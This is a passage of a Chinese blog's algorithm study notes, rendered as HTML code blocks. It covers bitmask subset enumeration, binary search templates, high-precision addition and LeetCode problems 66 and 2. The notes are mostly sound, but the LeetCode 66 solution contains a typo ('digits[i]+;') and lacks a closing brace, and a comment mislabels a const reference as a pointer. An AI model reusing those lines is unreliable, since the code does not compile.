class="hljs-number">0</span>;j&lt;<span class="hljs-number">15</span>;j++)<br>            &#123;<br>              <span class="hljs-keyword">if</span>(i&amp;(<span class="hljs-number">1</span>&lt;&lt;j))&#123;<span class="hljs-comment">//可以假设选取该位置为加油站</span><br>                  tmp*=<span class="hljs-number">2</span>;<br>                  a++;<br>              &#125;<br>              <span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">//不选取该位置为十字路口</span><br>                  tmp-=<span class="hljs-number">1</span>;<br>                  b++;<br>              &#125;<br>              <span class="hljs-keyword">if</span>(tmp&lt;=<span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(tmp==<span class="hljs-number">0</span>&amp;&amp;a==<span class="hljs-number">5</span>&amp;&amp;b==<span class="hljs-number">10</span>) ans++;<span class="hljs-comment">//满足题目条件的情况就加上1</span><br>        &#125;<br>        cout&lt;&lt;ans&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="权利指数">权利指数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs 题目">Description<br>在选举问题中，总共有n个小团体，每个小团体拥有一定数量的选票数。如果其中m个小团体的票数和超过总票数的一半，则此组合为“获胜联盟”。n个团体可形成若干个获胜联盟。一个小团体要成为一个“关键加入者”的条件是：在其所在的获胜联盟中，如果缺少了这个小团体的加入，则此联盟不能成为获胜联盟。一个小团体的权利指数是指：一个小团体在所有获胜联盟中成为“关键加入者”的次数。请你计算每个小团体的权利指数。<br>Input<br>输入数据的第一行为一个正整数T，表示有T组测试数据。每一组测试数据的第一行为一个正整数n（0&lt;n&lt;=20）。第二行有n个正整数，分别表示1到n号小团体的票数。<br>Output<br>对每组测试数据，在同一个行按顺序输出1到n号小团体的权利指数。<br>Sample Input<br>2<br>1<br>10<br>7<br>5 7 4 8 6 7 5<br>Sample Output<br>1<br>16 22 16 24 20 22 16<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> k;<br>    cin&gt;&gt;k;<br>    <span class="hljs-keyword">while</span>(k--)<br>    &#123;<br>        <span class="hljs-type">int</span> x,a[<span class="hljs-number">20</span>],sum=<span class="hljs-number">0</span>,flag[<span class="hljs-number">20</span>],b[<span class="hljs-number">20</span>],ans;<span class="hljs-comment">//注意总数再每组数据时要清零，我就栽在这非常久</span><br>        cin&gt;&gt;x;<br>        <span class="hljs-built_in">memset</span>(b,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(b));<span class="hljs-comment">//memset下保证上次数据不会影响</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;x;i++)&#123;<br>            cin&gt;&gt;a[i];<br>            sum+=a[i];<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;(<span class="hljs-number">1</span>&lt;&lt;x);i++)<br>        &#123;<br>            <span class="hljs-built_in">memset</span>(flag,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(flag));<span class="hljs-comment">//这里是关键，用flag记录每种子集选取了哪些位置，以便下面查找情况</span><br>            ans=<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;x;j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(i&amp;(<span class="hljs-number">1</span>&lt;&lt;j))<br>                &#123; ans+=a[j];flag[j]=<span class="hljs-number">1</span>;&#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(ans&lt;=sum/<span class="hljs-number">2</span>)&#123;<span class="hljs-comment">//满足题目条件，找本来不满足，多了一个位置后就可以满足的情况。</span><br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> z=<span class="hljs-number">0</span>;z&lt;x;z++)<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(flag[z]==<span class="hljs-number">0</span>&amp;&amp;ans+a[z]&gt;sum/<span class="hljs-number">2</span>) b[z]++;<br>                &#125;<br>            &#125;<br>            <span class="hljs-comment">/*if(ans&gt;=sum/2)&#123;//我原本是顺着题目意思写的，但这里我还不清楚为啥这样写oj过不去</span><br><span class="hljs-comment">                for(int z=0;z&lt;x;z++)</span><br><span class="hljs-comment">                &#123;</span><br><span class="hljs-comment">                    if(flag[z]==1&amp;&amp;ans-a[z]&lt;sum/2) b[z]++;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">            &#125;*/</span><br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;x<span class="hljs-number">-1</span>;i++) cout&lt;&lt;b[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        cout&lt;&lt;b[x<span class="hljs-number">-1</span>]&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="二分">二分</h1><h2 id="整数二分">整数二分</h2><p>二分模板1:（求下标最小的x）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">while</span>(l&lt;r)<br>&#123;<br>   <span class="hljs-type">int</span> mid=l+r&gt;&gt;<span class="hljs-number">1</span>;<br>   <span class="hljs-keyword">if</span>(a[mid]&gt;=x) r=mid;<br>   <span class="hljs-keyword">else</span> l=mid+<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">//l的范围时[l,mid],r的范围时(mid,r]</span><br><span class="hljs-comment">//当l+r&gt;&gt;1时是向下取整，所以不用担心死循环</span><br></code></pre></td></tr></table></figure><p>二分模板2：（求下标最大的x）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">while</span>(l&lt;r)<br>&#123;<br>   <span class="hljs-type">int</span> mid=l+r+<span class="hljs-number">1</span>&gt;&gt;<span class="hljs-number">1</span>;<br>   <span class="hljs-keyword">if</span>(a[mid]&lt;=x) l=mid;<br>   <span class="hljs-keyword">else</span> r=mid<span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-comment">//l的范围时[l,mid),r的范围时[mid,r]</span><br><span class="hljs-comment">//当mid=l+r+1&gt;&gt;1 因为在特殊条件下有可能死循环，当只有两个数，且正好按要求排序了的时候，如果选l+r&gt;&gt;1，因为会向下取整导致死循环</span><br></code></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs subunit">789 数的范围<br><br>给定一个按照升序排列的长度为 n 的整数数组，以及 q 个查询。<br><br>对于每个查询，返回一个元素 k 的起始位置和终止位置（位置从 0 开始计数）。<br><br>如果数组中不存在该元素，则返回 <span class="hljs-string">-1</span> <span class="hljs-string">-1</span>。<br><br>输入格式<br>第一行包含整数 n 和 q，表示数组长度和询问个数。<br><br>第二行包含 n 个整数（均在 1∼10000 范围内），表示完整数组。<br><br>接下来 q 行，每行包含一个整数 k，表示一个询问元素。<br><br>输出格式<br>共 q 行，每行包含两个整数，表示所求元素的起始位置和终止位置。<br><br>如果数组中不存在该元素，则返回 <span class="hljs-string">-1</span> <span class="hljs-string">-1</span>。<br><br>数据范围<br>1≤n≤100000<br>1≤q≤10000<br>1≤k≤10000<br>输入样例：<br>6 3<br>1 2 2 3 3 4<br>3<br>4<br>5<br>输出样例：<br>3 4<br>5 5<br><span class="hljs-string">-1</span> <span class="hljs-string">-1</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> q[N],n,m;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;q[i]);<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-type">int</span> k;<br>        cin&gt;&gt;k;<br>        <span class="hljs-type">int</span> l=<span class="hljs-number">0</span>,r=n<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">while</span>(l&lt;r)&#123;<br>            <span class="hljs-type">int</span> mid=l+r&gt;&gt;<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(q[mid]&gt;=k) r=mid;<span class="hljs-comment">//找最早出现的k，那么k后的数都满足大于等于k</span><br>            <span class="hljs-keyword">else</span> l=mid+<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(q[l]!=k) cout&lt;&lt;<span class="hljs-string">&quot;-1 -1&quot;</span>&lt;&lt;endl;<br>        <span class="hljs-keyword">else</span> <br>        &#123;<br>            cout&lt;&lt;l&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>            <span class="hljs-type">int</span> l=<span class="hljs-number">0</span>,r=n<span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">while</span>(l&lt;r)&#123;<br>                <span class="hljs-type">int</span> mid=l+r+<span class="hljs-number">1</span>&gt;&gt;<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">if</span>(q[mid]&lt;=k) l=mid;<span class="hljs-comment">//找最后出现的k,那么k前面的数都满足小于等于k</span><br>                <span class="hljs-keyword">else</span> r=mid<span class="hljs-number">-1</span>;<br>            &#125;<br>            cout&lt;&lt;l&lt;&lt;endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="浮点数二分">浮点数二分</h2><p>模板</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">while</span>(r-l&gt;<span class="hljs-number">1e-6</span>)<br>&#123;<br>  mid=(l+r)/<span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">check</span>(mid)) r=mid;<br>  <span class="hljs-keyword">else</span> l=mid;<br>&#125;<br><span class="hljs-comment">//当r-l&lt;1e-8的时候，r和l的值可以近似认为是答案</span><br></code></pre></td></tr></table></figure><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs excel">给定一个浮点数 <span class="hljs-built_in">n</span>，求它的三次方根。<br><br>输入格式<br>共一行，包含一个浮点数 <span class="hljs-built_in">n</span>。<br><br>输出格式<br>共一行，包含一个浮点数，表示问题的解。<br><br>注意，结果保留 <span class="hljs-number">6</span> 位小数。<br><br>数据范围<br>−<span class="hljs-number">10000</span>≤<span class="hljs-built_in">n</span>≤<span class="hljs-number">10000</span><br>输入样例：<br><span class="hljs-number">1000.00</span><br>输出样例：<br><span class="hljs-number">10.000000</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">double</span> x;<br>    cin&gt;&gt;x;<br>    <span class="hljs-type">double</span> l=<span class="hljs-number">-10000</span>,r=<span class="hljs-number">10000</span>;<br>    <span class="hljs-keyword">while</span>(r-l&gt;<span class="hljs-number">1e-8</span>)<br>    &#123;<br>        <span class="hljs-type">double</span> mid=(l+r)/<span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span>((mid*mid*mid)&gt;=x) r=mid;<br>        <span class="hljs-keyword">else</span> l=mid;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.6lf&quot;</span>,l);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="高精度">高精度</h1><h2 id="高精度加法">高精度加法</h2><p>高精度加法关键在于将每一位数字拆解，然后逆向存入数组里（比如输入进来1234，在传入数组中的时候值为4321，然后再利用小学数学加法的知识，每一位数字的值为A[I]+B[I]+t(t为进位的值)，循环进行直到遍历到数组a和b的结束位置</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs">给定两个正整数（不含前导 0），计算它们的和。<br><br>输入格式<br>共两行，每行包含一个整数。<br><br>输出格式<br>共一行，包含所求的和。<br><br>数据范围<br>1≤整数长度≤100000<br>输入样例：<br>12<br>23<br>输出样例：<br>35<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp;A,<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp;B)</span><span class="hljs-comment">//为啥是传入指针，因为数组A和B的内存过大，如果传入形参会导致内存溢出</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt; C;<br>    <span class="hljs-type">int</span> t=<span class="hljs-number">0</span>;<span class="hljs-comment">//进位</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;A.<span class="hljs-built_in">size</span>()||i&lt;B.<span class="hljs-built_in">size</span>();i++)<span class="hljs-comment">//遍历到数组A或数组B结束位置</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(i&lt;A.<span class="hljs-built_in">size</span>()) t+=A[i];<span class="hljs-comment">//如果没到A结束位置就加上该位置的值</span><br>        <span class="hljs-keyword">if</span>(i&lt;B.<span class="hljs-built_in">size</span>()) t+=B[i];<br>        C.<span class="hljs-built_in">push_back</span>(t%<span class="hljs-number">10</span>);<span class="hljs-comment">//传入未进位的部分，比如t=18,在算数中，1进位，然后7传入</span><br>        t/=<span class="hljs-number">10</span>;<span class="hljs-comment">//记录下进位的数</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(t) C.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string a,b;<span class="hljs-comment">//因为数据过大，只能用字符串形式传入</span><br>    vector&lt;<span class="hljs-type">int</span>&gt;A,B;<br>    cin&gt;&gt;a&gt;&gt;b;<span class="hljs-comment">//a=&quot;1234&quot;</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=a.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) A.<span class="hljs-built_in">push_back</span>(a[i]-<span class="hljs-string">&#x27;0&#x27;</span>);<span class="hljs-comment">//逆向计入每一位的值 A[]=[4,3,2,1]</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=b.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) B.<span class="hljs-built_in">push_back</span>(b[i]-<span class="hljs-string">&#x27;0&#x27;</span>);<br>    <span class="hljs-keyword">auto</span> C=<span class="hljs-built_in">add</span>(A,B);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=C.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) cout&lt;&lt;C[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="leetcode66题">leetcode66题</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">66.</span> 加一<br>给定一个由 整数 组成的 非空 数组所表示的非负整数，在该数的基础上加一。<br><br>最高位数字存放在数组的首位， 数组中每个元素只存储单个数字。<br><br>你可以假设除了整数 0 之外，这个整数不会以零开头。<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*我的做法,相对麻烦了点，和模板的高精度加法类似*/</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">plusOne</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; digits)</span> </span>&#123;<br>          vector&lt;<span class="hljs-type">int</span>&gt; ans;<br>          <span class="hljs-type">int</span> t=<span class="hljs-number">1</span>;<br>          <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=digits.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--)<br>          &#123;<br>              t+=digits[i];<br>              ans.<span class="hljs-built_in">push_back</span>(t%<span class="hljs-number">10</span>);<br>              t/=<span class="hljs-number">10</span>;<br>          &#125;<br>          <span class="hljs-keyword">if</span>(t) ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">1</span>);<br>          <span class="hljs-built_in">reverse</span>(ans.<span class="hljs-built_in">begin</span>(),ans.<span class="hljs-built_in">end</span>());<br>          <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*题解的做法，就是找到从尾巴开始的最长的9，如果从尾部开始有9就变成0，然后往前移动，如果超出了最开头，就把vector加一*/</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">plusOne</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; digits)</span> </span>&#123;<br>        <span class="hljs-type">int</span> i=digits.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">while</span>(i&gt;=<span class="hljs-number">0</span>&amp;&amp;digits[i]==<span class="hljs-number">9</span>)<br>        &#123;<br>           digits[i]=<span class="hljs-number">0</span>;<br>           i--;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(i==<span class="hljs-number">-1</span>) digits.<span class="hljs-built_in">insert</span>(digits.<span class="hljs-built_in">begin</span>(),<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">else</span> digits[i]+;<br>        <span class="hljs-keyword">return</span> digits;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="leetcode第二题">leetcode第二题</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">2</span>. 两数相加<br>给你两个 非空 的链表，表示两个非负的整数。它们每位数字都是按照 逆序 的方式存储的，并且每个节点只能存储 一位 数字。<br><br>请你将两个数相加，并以相同形式返回一个表示和的链表。<br><br>你可以假设除了数字 <span class="hljs-number">0</span> 之外，这两个数都不会以 <span class="hljs-number">0</span> 开头。<br>示例 <span class="hljs-number">1</span>：<br>输入：l1 = <span class="hljs-selector-attr">[2,4,3]</span>, l2 = <span class="hljs-selector-attr">[5,6,4]</span><br>输出：<span class="hljs-selector-attr">[7,0,8]</span><br>解释：<span class="hljs-number">342</span> + <span class="hljs-number">465</span> = <span class="hljs-number">807</span>.<br>示例 <span class="hljs-number">2</span>：<br><br>输入：l1 = <span class="hljs-selector-attr">[0]</span>, l2 = <span class="hljs-selector-attr">[0]</span><br>输出：<span class="hljs-selector-attr">[0]</span><br>示例 <span class="hljs-number">3</span>：<br><br>输入：l1 = <span class="hljs-selector-attr">[9,9,9,9,9,9,9]</span>, l2 = <span class="hljs-selector-attr">[9,9,9,9]</span><br>输出：<span class="hljs-selector-attr">[8,9,9,9,0,0,0,1]</span><br> <br><br>提示：<br><br>每个链表中的节点数在范围 <span class="hljs-selector-attr">[1, 100]</span> 内<br><span class="hljs-number">0</span> &lt;= Node<span class="hljs-selector-class">.val</span> &lt;= <span class="hljs-number">9</span><br>题目数据保证列表表示的数字不含前导零<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> 